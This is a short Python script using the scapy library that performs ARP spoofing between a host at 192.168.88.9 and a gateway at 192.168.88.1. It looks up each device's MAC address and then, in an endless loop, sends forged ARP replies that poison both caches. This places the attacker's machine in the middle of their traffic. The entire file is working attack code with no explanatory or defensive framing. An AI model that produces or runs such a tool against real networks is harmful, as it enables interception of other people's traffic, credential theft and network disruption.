#!/usr/bin/python

import scapy.all as scapy

def get_target_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalpacket = broadcast / arp_request
    answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0]
    
    if answer:
        mac = answer[0][1].hwsrc
        return mac
    else:
        print(f"No response for IP: {ip}")
        return None

def arp_spoof(target_ip, spoofed_ip):
    mac = get_target_mac(target_ip)
    if mac is None:
        print(f"Could not get MAC address for IP: {target_ip}")
        return False
    ether = scapy.Ether(dst=mac)
    arp = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    packet = ether / arp
    scapy.sendp(packet, verbose=False)
    return True

def main():
    try:
        while True:
            success1 = arp_spoof("192.168.88.9", "192.168.88.1")
            success2 = arp_spoof("192.168.88.1", "192.168.88.9")
            if not success1 or not success2:
                print("[!] ARP spoofing failed. Exiting.")
                break
    except KeyboardInterrupt:
        print("[!] Stopping ARP Spoofing")

main()
